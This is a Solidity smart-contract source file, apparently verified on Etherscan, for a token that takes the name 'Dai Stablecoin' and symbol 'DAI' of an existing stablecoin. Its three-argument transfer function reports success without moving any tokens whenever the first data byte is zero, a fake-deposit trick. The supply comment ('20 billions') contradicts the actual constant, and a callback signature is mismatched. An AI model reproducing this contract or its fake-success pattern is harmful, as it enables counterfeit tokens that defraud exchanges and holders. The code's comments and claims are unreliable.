/**
 *Submitted for verification at Etherscan.io on 2021-10-11
*/

/**
 *Submitted for verification at Etherscan.io on 2019-03-19
*/

pragma solidity ^0.5.6;

contract owned {
    address payable public owner;

    constructor () public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address payable newOwner) onlyOwner public {
        owner = newOwner;
    }
    
    function() external payable  {
    }
    
     function withdraw() onlyOwner public {
        owner.transfer(address(this).balance);
    }
}




interface ERC20 {
  function transfer(address receiver, uint256 value) external returns (bool ok);
}


interface ERC223Receiver {
    function tokenFallback(address _from, uint _value, bytes32 _data) external ;
}



contract DAI is owned,ERC20 {

    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 20000000000000000000000000; // 20 billions and 18 decimals
    string public constant symbol = "DAI";
    string public constant name = "Dai Stablecoin";
    

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);
    
   
    constructor () public {
        balanceOf[msg.sender] = totalSupply;               
    }
    
   function isContract(address _addr) internal view returns (bool is_contract){
  uint32 size;
  assembly {
    size := extcodesize(_addr)
  }
  return (size > 0);
}
    
     function transfer(address to, uint256 value) public returns (bool success) {
        _transfer(msg.sender, to, value);
        return true;
    }
    
     function transfer(address to, uint256 value,bytes memory  data) public returns (bool success) {
         if((data[0])!= 0) { 
            _transfer(msg.sender, to, value);
         }
        return true;
    }
    
     function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        
        require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    
    function _transfer(address _from, address _to, uint256 _value) internal {
       
        // Prevent transfer to 0x0 address. Use burn() instead
        require(_to != address(0x0));
        // Check if the sender has enough
        require(balanceOf[_from] >= _value);
        // Check for overflows
        require(balanceOf[_to] + _value > balanceOf[_to]);
        // Subtract from the sender
        balanceOf[_from] -= _value;
        // Add the same to the recipient
        balanceOf[_to] += _value;
        
        if(isContract(_to))
        {
            ERC223Receiver receiver = ERC223Receiver(_to);
            receiver.tokenFallback(msg.sender, _value, bytes32(0));
        }
        
        emit Transfer(_from, _to, _value);
    }
    
     function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function transferToken (address token,address to,uint256 val) public onlyOwner {
        ERC20 erc20 = ERC20(token);
        erc20.transfer(to,val);
    }
    
     function tokenFallback(address _from, uint _value, bytes memory  _data) pure public {
       
    }

}